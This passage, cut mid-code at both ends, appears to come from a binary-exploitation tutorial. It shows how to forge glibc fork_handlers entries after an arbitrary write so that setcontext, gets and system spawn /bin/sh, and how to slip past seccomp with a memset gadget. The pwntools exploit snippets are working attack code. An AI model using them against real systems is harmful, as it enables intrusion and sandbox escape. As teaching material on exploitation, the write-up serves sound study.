style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># cwd</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x02</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p16</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xffff</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># swd</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x04</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p16</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic"># ftw</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x06</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p16</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xffff</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># fop</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x08</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xffffffff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># rip</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">			</span><span class="token comment" style="color:#999988;font-style:italic"># rdp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1f80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">	    </span><span class="token comment" style="color:#999988;font-style:italic"># mxcsr</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">bytes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">frame</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#	0xf8: 0					# end of SigreturnFrame</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x128</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">				</span><span class="token comment" style="color:#999988;font-style:italic"># uc_sigmask</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x1a8</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> fpstate</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">			</span><span class="token comment" style="color:#999988;font-style:italic"># fpstate</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fork_handlers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addr_ctx </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x20</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> forge</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">setcontext</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">addr_ctx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> setcontext</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rdi&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">next</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">search</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rsi&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rdx&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">execve</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rsp&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> addr_ctx</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr_ctx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><br></span></code></pre></div></div>
<p>For demo purposes, I&#x27;m just executing <code>execve</code>, but you can do much more with <code>setcontext</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="gets">gets<a href="#gets" class="hash-link" aria-label="Direct link to gets" title="Direct link to gets">​</a></h3>
<p>Both of these examples require the <code>/bin/sh</code> string or the <code>SigreturnFrame</code> to already exist in memory, or be apart of the arbitrary write. But what if we don&#x27;t have such a luxury? Well since <code>rdi</code> will be controlled for every function call, we can use <code>gets</code> to write data to the argument, before using it for <code>system</code>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fork_handlers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> forge</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gets</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">system</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># could also be any command we wish</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extra_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;Enter address, size and data: &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">addr</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">len</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">data</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">+</span><span class="token string-interpolation interpolation number" style="color:#36acaa">2</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> &quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> extra_data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">extra_data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Or <code>setcontext</code>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fork_handlers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addr_ctx </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x20</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> forge</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gets</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">setcontext</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">addr_ctx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extra_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> setcontext</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rdi&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">next</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">search</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rsi&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rdx&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">execve</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rsp&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> addr_ctx</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr_ctx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> extra_data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;Enter address, size and data: &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">addr</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">len</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">data</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">+</span><span class="token string-interpolation interpolation number" style="color:#36acaa">2</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> &quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> extra_data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">extra_data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="seccomp-strikes-back">Seccomp strikes back!<a href="#seccomp-strikes-back" class="hash-link" aria-label="Direct link to Seccomp strikes back!" title="Direct link to Seccomp strikes back!">​</a></h3>
<p>Our good old <del>friend</del> enemy seccomp isn&#x27;t always easily defeated by <code>setcontext</code>, because there&#x27;s a nuisance I have yet to cover. If we have another look at <code>setcontext</code>:</p>
<figure><img src="/assets/image (79).png" alt=""><figcaption><p><code>setcontext</code>: Calling <code>sigprocmask</code> syscall.</p></figcaption></figure>
<p>We see that it executes a syscall <em>before</em> it sets the context, with syscall number <code>0xe</code>. This is <code>sigprocmask</code>, and while it may not be on the radar of any blacklists, it could be easily left out of a whitelist (like <code>seccomp</code>&#x27;s strict mode), meaning this could invoke <code>seccomp</code>&#x27;s wrath.</p>
<p>What if we tried to skip the syscall? It&#x27;s a good suggestion, but a wrench in the plan here is the fact that it restores the pointer to the context in <code>rdx</code>, not <code>rdi</code>, so we&#x27;d need to control <code>rdx</code> somehow.</p>
<p>Wouldn&#x27;t it be nice if we could convert our current <code>rdi</code> control into <code>rdx</code> control, because <code>rdx</code> isn&#x27;t used by <code>__run_fork_handlers</code>. Well it turns out there is a gadget that can do just that!</p>
<figure><img src="/assets/image (80).png" alt=""><figcaption><p><code>mov rdx, rdi</code> gadget</p></figcaption></figure>
<p>Exactly one in fact. However if you&#x27;re anything like me (<del>and I surely hope not</del>), you&#x27;d wonder where this came from, and is this something that&#x27;s likely to come up across multiple versions of libc, because it would be nice if our techniques were portable(ish).</p>
<figure><img src="/assets/image (81).png" alt=""><figcaption><p><code>x/10i 0xc5044</code></p></figcaption></figure>
<figure><img src="/assets/image (83).png" alt=""><figcaption><p><code>__memset_erms</code></p></figcaption></figure>
<p>It seems to belong to a function <code>__memset_erms</code>, which in hindsight makes sense. It explains the <code>rep stos</code> instruction: it&#x27;s filling the buffer with the character <code>al</code>. And since <code>rep stos</code> increments <code>rdi</code>, it needs to save a copy, so that it can return that original pointer, as that&#x27;s the <a href="https://man7.org/linux/man-pages/man3/memset.3.html#RETURN_VALUE" target="_blank" rel="noopener noreferrer">defined behaviour</a> of <code>memset</code>.</p>
<p>But why did it compile like this, and why is <code>rdx</code> used, surely this could change, right? Well let&#x27;s find out:</p>
<figure><img src="/assets/image (85).png" alt=""><figcaption><p>Using <code>list</code> to find where it&#x27;s defined.</p></figcaption></figure>
<figure><img src="/assets/image (86).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/multiarch/memset-vec-unaligned-erms.S#L150">__memset_erms</a></p></figcaption></figure>
<p>Turns it the reason it compiled that way, is because that&#x27;s exactly how libc wanted it: it used assembly language (<code>.S</code> is a common extension for assembly language files). From what I could see, this behaviour is also consistent across many versions, probably because there&#x27;s no real reason to change it:</p>
<ul>
<li>It&#x27;s simple, so not much to change in the first place.</li>
<li>If it ain&#x27;t broke, don&#x27;t fix it.</li>
<li>It&#x27;s not actually used, it&#x27;s just used for performance measuring.</li>
</ul>
<p>Fantastic, we have a <code>mov rdx, rdi</code> gadget! But one final snag, we ideally want to set <code>rcx</code> or <code>rdx</code> to <code>0</code> before this gadget executes, so that <code>rep stos</code> finishes immediately (i.e. doesn&#x27;t run).</p>
<figure><img src="/assets/Screenshot 2024-08-25 001133.jpg" alt=""><figcaption><p>Where to jump to + preconditions</p></figcaption></figure>
<figure><img src="/assets/image (88).png" alt=""><figcaption><p>Null <code>rcx</code> gadgets</p></figcaption></figure>
<figure><img src="/assets/image (89).png" alt=""><figcaption><p>Null <code>rdx</code> gadgets</p></figcaption></figure>
<p>Putting this all together, we arrive at the following:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fork_handlers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addr_ctx </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> forge</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gets</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0xa85d8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">__memset_erms</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">13</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">setcontext</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">45</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">addr_ctx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extra_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> setcontext</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rdi&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">next</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">search</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rsi&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rdx&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">execve</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rsp&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> addr_ctx</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr_ctx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" 